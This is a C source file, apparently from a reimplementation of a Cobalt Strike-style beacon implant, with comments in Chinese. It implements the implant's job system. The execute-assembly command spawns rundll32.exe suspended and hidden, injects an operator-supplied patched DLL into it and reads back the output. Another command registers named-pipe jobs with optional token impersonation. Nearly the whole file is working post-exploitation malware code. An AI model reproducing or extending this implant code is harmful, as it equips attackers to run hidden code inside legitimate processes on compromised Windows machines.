#include "Job.h"
#include "Command.h"
#include "Pipe.h"
#include "DllInject.h"

JOB_ENTRY* gJobs = NULL;

JOB_ENTRY* JobAdd(JOB_ENTRY* newJob)
{
	static DWORD gJobCurrentId = 0;

	JOB_ENTRY* job = gJobs;
	newJob->id = gJobCurrentId++;

	// 放在链表末尾
	if (job)
	{
		while (job->next)
			job = job->next;

		job->next = newJob;
	}
	else
	{
		gJobs = newJob;
	}

	return job;
}

void JobCleanup()
{
	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->isDead)
		{
			if (!job->isPipe)
			{
				CloseHandle(job->process);
				CloseHandle(job->thread);
				CloseHandle(job->hRead);
				CloseHandle(job->hWrite);
			}
			else
			{
				DisconnectNamedPipe(job->hRead);
				CloseHandle(job->hRead);
			}
		}
	}

	JOB_ENTRY* prev = NULL;
	JOB_ENTRY** pNext;
	for (JOB_ENTRY* job = gJobs; job; job = *pNext)
	{
		if (!job->isDead)
		{
			prev = job;
			pNext = &job->next;
			continue;
		}

		if (prev)
			pNext = &prev->next;
		else
			pNext = &gJobs;

		*pNext = job->next;
		free(job);
	}
}

JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, unsigned char* description, BOOL isMsgMode)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}

	job->hWrite = INVALID_HANDLE_VALUE;
	job->next = NULL;
	job->isMsgMode = isMsgMode;
	job->hRead = hRead;
	job->isPipe = TRUE;
	job->pid32 = pid32;
	job->callbackType = callbackType;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, unsigned char* description)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}

	job->process = pi->hProcess;
	job->thread = pi->hThread;
	job->next = NULL;
	job->isPipe = FALSE;
	job->hRead = hRead;
	job->hWrite = hWrite;
	job->pid = pi->dwProcessId;
	job->callbackType = CALLBACK_OUTPUT;
	job->isMsgMode = JOB_MODE_BYTE;
	job->pid32 = pi->dwProcessId;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

DWORD JobReadDataFromPipe(HANDLE hPipe, unsigned char* buffer, int size)
{
	DWORD totalBytesAvail = 0;
	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
		fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
		return -1;
	}

	DWORD read = 0;
	DWORD totalRead = 0;

	while (totalBytesAvail)
	{
		if (totalRead >= size)
			break;

		if (!ReadFile(hPipe, buffer, size - totalRead, &read, NULL)) {
			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
			return -1;
		}

		totalRead += read;
		buffer += read;

		if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
			fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
			return -1;
		}
	}

	return totalRead;
}

DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int size)
{
	DWORD lpTotalBytesAvail;
	DWORD headerSize = 0;

	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL))
		return -1;

	if (!lpTotalBytesAvail)
		return 0;

	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&headerSize, sizeof(headerSize)) != sizeof(headerSize) || headerSize > size)
		return -1;

	return ProtocolSmbPipeRead(hPipe, buffer, headerSize);
}

int ProtocolSmbPipeRead(HANDLE channel, unsigned char* buffer, int length)
{
	int read, totalRead;
	for (totalRead = 0; totalRead < length; totalRead += read)
	{
		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &read, NULL)) {
			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
			return -1;
		}

		if (read == 0)
			return -1;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

void ProcessJobEntry(int max) {
	JOB_ENTRY* tmpJob = gJobs;
	/*
	* 必须为有符号
	* 在JobReadDataFromPipeWithHeader 
	* JobReadDataFromPipe 中 直接返回了 -1 无符号表示为0xFFFFFFFF
	* 判断 totalRead 就会大于 0、
	* 传入到 DataProcess 中就为 0xFFFFFFFF 
	* 从而在 DataProcess 引发访问边界错误
	*/
	int totalRead = 0;
	unsigned char* buf = NULL;

	// 没有注册的 Job
	if(tmpJob == NULL)
		return;

	buf = (unsigned char*)malloc(sizeof(char) * max);

	while (tmpJob) {
		// 判断数据类型
		if (tmpJob->isMsgMode == JOB_MODE_MESSAGE) {
			totalRead = JobReadDataFromPipeWithHeader(tmpJob->hRead, buf, max);
		}
		else {
			totalRead = JobReadDataFromPipe(tmpJob->hRead, buf, max);
		}

		if (totalRead > 0) {
			DataProcess(buf, totalRead, tmpJob->callbackType);
		}

		// 判断是否有死掉的进程
		if (tmpJob->isPipe == JOB_ENTRY_NAMEDPIPE && totalRead == -1) {
			tmpJob->isDead = JOB_STATUS_DEAD;
		}
		else if(tmpJob->isPipe == JOB_ENTRY_PROCESS && WaitForSingleObject(tmpJob->process, 0) != WAIT_TIMEOUT) {
			tmpJob->isDead = JOB_STATUS_DEAD;
		}
		if (tmpJob->isMsgMode == JOB_MODE_MESSAGE && totalRead > 0) {

		}
		else {
			tmpJob = (JOB_ENTRY*)tmpJob->next;
		}
	} 

	free(buf);
	JobCleanup();
}

unsigned char* CmdJobList(size_t* msgLen) {
	formatp format;
	BeaconFormatAlloc(&format, 0x8000);


	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		BeaconFormatPrintf(&format, "%d\t%d\t%s\n", job->id, job->pid32, job->description);
	}

	int size = BeaconDataLength(&format);
	unsigned char* buffer = BeaconDataOriginal(&format);
	*msgLen = size;
	unsigned char* postMsg = (unsigned char*)malloc(size + 1);
	if (!postMsg) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}
	memcpy(postMsg, buffer, size);
	postMsg[size] = '\0';

	BeaconFormatFree(&format);

	return postMsg;
}

unsigned char* CmdJobKill(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLength) {
	datap parser;
	BeaconDataParse(&parser, commandBuf, commandBuflen);
	WORD id = BeaconDataShort(&parser);
	BOOL Flag = FALSE;

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->id == id) {
			job->isDead = TRUE;
			Flag = TRUE;
		}
	}

	unsigned char* success = "[*] Kill Job Successed!";
	unsigned char* fail = "[*] Kill Job Failed!";
	unsigned char* postMsg;
	if (Flag) {
		postMsg = (unsigned char*)malloc(strlen(success));
		memcpy(postMsg, success, strlen(success));
		*msgLength = strlen(success);
		postMsg[*msgLength] = '\0';
	}
	else {
		postMsg = (unsigned char*)malloc(strlen(fail));
		if (!postMsg) {
			fprintf(stderr, "Memory allocation failed\n");
			return NULL;
		}
		memcpy(postMsg, fail, strlen(fail));
		*msgLength = strlen(fail);
		postMsg[*msgLength] = '\0';
	}
	JobCleanup();
	
	return postMsg;
}

VOID CmdJobRegister(unsigned char* commandBuf, size_t commandBuflen, BOOL impersonate, BOOL isMsgMode)
{
	char filename[64] = { 0 };
	char description[64] = { 0 };

	datap parser;
	BeaconDataParse(&parser, commandBuf, commandBuflen);
	int pid32 = BeaconDataInt(&parser);              // 4 bytes
	short callbackType = BeaconDataShort(&parser);   // 2 bytes
	short waitTime = BeaconDataShort(&parser);       // 2 bytes

	if (!BeaconDataStringCopySafe(&parser, filename, sizeof(filename)))
		return;

	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
		return;

	HANDLE hPipe;
	int attempts = 0;
	while (!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0))
	{
		Sleep(500);
		if (++attempts >= 20)
		{
			fprintf(stderr, "Could not connect to pipe:%lu\n", GetLastError());
			return;
		}
	}

	if (waitTime)
	{
		PipeWaitForExec(hPipe, waitTime, 500);
	}

	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
}

VOID CmdExecuteAssembly(unsigned char* commandBuf, size_t commandBuflen) {
	// 数据包格式：callbackType(2 Bytes) || waitTime(2 Bytes) || offset(4 Bytes) || description || arguLength(4 Bytes) || argument(arguLength Bytes) || patchDll(patchDllSize Bytes)
	datap* desc = BeaconDataAlloc(64);
	unsigned char* description = BeaconDataPtr(desc, 64);

	datap parser;
	BeaconDataParse(&parser, commandBuf, commandBuflen);
	WORD callbackType = BeaconDataShort(&parser); // 2 Bytes
	WORD waitTime = BeaconDataShort(&parser);     // 2 Bytes
	DWORD offset = BeaconDataInt(&parser);        // 4 Bytes
	DWORD descLength = BeaconDataStringCopySafe(&parser, description, 64);
	DWORD arguLength = BeaconDataInt(&parser);    // 4 Bytes
	unsigned char* argument = arguLength ? BeaconDataPtr(&parser, arguLength) : NULL; // Argument Bytes
	unsigned char* patchCSharp = BeaconDataBuffer(&parser);
	DWORD patchCSharpSize = BeaconDataLength(&parser);

	JobSpawn(callbackType, waitTime, offset, patchCSharp, patchCSharpSize, argument, arguLength, description, descLength);

	BeaconDataFree(desc);
}

VOID JobSpawn(WORD callbackType, WORD waitTime, DWORD offset, unsigned char* patchCSharp, DWORD patchCSharpSize, unsigned char* argument, DWORD arguLength, unsigned char* description, DWORD descLength) {
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

	HANDLE hRead, hWrite;
	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
	GetStartupInfoA(&si);
	si.hStdOutput = hWrite;
	si.hStdError = hWrite;
	si.hStdInput = NULL;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	unsigned char* spawnProcess = "C:\\Windows\\System32\\rundll32.exe";
	if (!CreateProcessA(NULL, spawnProcess, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
		return;
	}

	Sleep(100);
	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, patchCSharp, patchCSharpSize, offset, argument, arguLength);

	// 等待 waitTime(默认 2s) 2s 内向管道中取数据
	if (waitTime) {
		PipeWaitForExec(hRead, waitTime, 500);
	}

	JobRegisterProcess(&pi, hRead, hWrite, description);
}



